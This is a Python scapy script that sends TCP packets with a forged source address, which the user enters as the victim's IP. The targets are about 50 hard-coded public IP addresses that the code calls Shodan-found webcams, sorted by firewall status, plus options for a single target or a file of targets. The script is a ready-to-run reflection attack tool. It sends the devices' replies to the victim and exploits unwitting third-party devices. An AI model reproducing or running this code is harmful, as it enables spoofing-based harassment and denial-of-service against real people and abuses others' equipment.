from scapy.all import *
#Requires scapy installation

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import time



#No firewall IPs
addr = ['91.222.199.146', '218.161.127.8', '67.232.115.212', '114.33.5.118', '213.19.70.122', '61.214.231.115', '192.42.132.171', '178.218.43.251', '171.246.239.74', '59.127.99.201', '59.125.116.232', '122.116.249.75', '220.135.55.1', '114.34.123.55', '171.225.122.104', '59.120.39.206', '220.134.182.145', '118.163.196.214', '89.91.238.2', '164.177.97.174', '164.177.104.38', '89.91.230.63', '193.253.33.174', '89.91.230.64', '164.177.103.65', '164.177.99.252', '67.232.115.212', '117.218.151.177', '96.83.52.235', '91.183.122.131', '175.197.122.68', '172.90.22.121']
ports = [8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080 , 8080]

#Firewall IPs
addr2 = ['216.240.7.130', '107.182.38.118', '76.115.237.112', '109.255.76.2', '89.249.224.121', '103.4.165.230', '115.85.64.66', '37.196.186.108', '92.192.8.78']
ports2 = [9191, 8080, 8080, 8080, 8080, 8888, 8080, 8080, 8080]

#Undecided firewall IPs
addr3 = ['88.193.236.0', '137.193.65.97', '81.133.95.150', '190.189.168.54', '31.16.209.51', '98.145.132.253', '83.194.44.113', '89.98.64.153', '69.172.177.157', '108.183.71.121', '104.159.200.254', '70.82.148.81', '181.47.123.175']
ports3 = [8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8080, 8081, 8081, 8080, 8080]
index = 0

total = len(addr) + len(addr2) + len(addr3)
print('There are %s total Web Cam IPs that can be used.'%total)

A = input('Victim IP/Spoofed IP: ')# spoofed source IP address
C = RandShort() # spoofed source port
choice = int(input('\nChoice of Shodan Web Cam IPs (1, 2, or 3):\n------------------------------------------\n\t1. No Firewall\n\t2. With Firewall\n\t3. Undecided Firewall Capabilities\n\t4. Single Webcam IP\n\t5. Read Ips from file\n'))
payload = "It's a disaster" # packet payload
packets = range(1, 2) #send 1 packets per IP



if choice == 1:
    #No firewall IPs
    for i in packets:
        for j in range(len(addr)):
            spoofed_packet = IP(src=A, dst=addr[j]) / TCP(sport=C, dport=ports[j]) / payload
            send(spoofed_packet)
            index = index + 1
            print('Packet sent to : %s \n%s packets sent in total'% (addr[j], index))
            time.sleep(1) #Remove sleep to send without break.
if choice == 2:
    #Firewall IPs
    for i in packets:
        for j in range(len(addr2)):
            spoofed_packet = IP(src=A, dst=addr2[j]) / TCP(sport=C, dport=ports2[j]) / payload
            send(spoofed_packet)
            index = index + 1
            print('Packet sent to : %s \n%s packets sent in total'% (addr2[j], index))
            time.sleep(1)
if choice == 3:
    #Undecided firewall IPs
    for i in packets:
        for j in range(len(addr3)):
            spoofed_packet = IP(src=A, dst=addr3[j]) / TCP(sport=C, dport=ports3[j]) / payload
            send(spoofed_packet)
            index = index + 1
            print('Packet sent to : %s \n%s packets sent in total'% (addr3[j], index))
            time.sleep(1)
if choice == 4:
    #Single webcam/IoT device IP
    B = input('Destination IP address: ') # destination IP address e.g 83.162.177.14:8081
    D = int(input('Destination IP Port: ')) # destination port
    for i in packets:
        spoofed_packet = IP(src=A, dst=B) / TCP(sport=C, dport=D) / payload
        send(spoofed_packet)
        index = index + 1
        print('Packet sent to : %s \n%s packets sent in total'% (B, index))
        time.sleep(1)
if choice == 5:
	#multiple IPs from file
	ip_filename = input('Enter name of file to open with IPs and ports: ')
	ipF = open(ip_filename, "r")
	addr4 = []
	ports4 = []
	for ip_line in ipF:
		templine = ip_line.split()
		addr4.append(templine[0].strip())
		ports4.append( int(templine[1].strip()) )
	
	for i in packets:
		for j in range(len(addr4)):
			spoofed_packet = IP(src=A, dst=addr4[j]) / TCP(sport=C, dport=ports4[j]) / payload
			send(spoofed_packet)
			index = index + 1
			print('Packet sent to : %s \n%s packets sent in total'% (addr4[j], index))
			time.sleep(1) #Remove sleep to send without break.
	